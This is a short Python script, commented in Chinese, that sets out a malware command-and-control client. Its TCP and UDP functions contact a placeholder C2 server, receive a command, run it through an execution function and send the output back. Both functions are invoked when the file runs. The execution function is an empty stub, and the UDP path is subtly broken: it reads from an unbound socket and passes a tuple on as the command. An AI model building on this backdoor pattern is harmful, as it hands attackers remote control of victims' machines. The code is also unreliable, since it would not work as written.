import socket

# 建立一個 TCP Socket
def create_tcp_socket():
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 建立一個 UDP Socket
def create_udp_socket():
    return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 透過 TCP 進行 command and control
def tcp_c2(address, port):
    try:
        # 建立 TCP Socket
        sock = create_tcp_socket()
        # 連線至 C2 伺服器
        sock.connect((address, port))
        # 取得命令
        command = sock.recv(1024)
        # 執行命令
        result = execute_command(command)
        # 將結果傳送回 C2 伺服器
        sock.sendall(result)
        # 關閉連線
        sock.close()
    
    except Exception as e:
        print("Error: %s" % str(e))

# 透過 UDP 進行 command and control
def udp_c2(address, port):
    try:
        # 建立 UDP Socket
        sock = create_udp_socket()
        # 取得命令
        command = sock.recvfrom(1024)
        # 執行命令
        result = execute_command(command)
        # 將結果傳送回 C2 伺服器
        sock.sendto(result, (address, port))
        # 關閉連線
        sock.close()
    
    except Exception as e:
        print("Error: %s" % str(e))

# 執行命令
def execute_command(command):
    # 在這裡實現相應的命令執行邏輯
    pass

# 呼叫方法
tcp_c2("C2_SERVER_ADDRESS", 1234)
udp_c2("C2_SERVER_ADDRESS", 5678)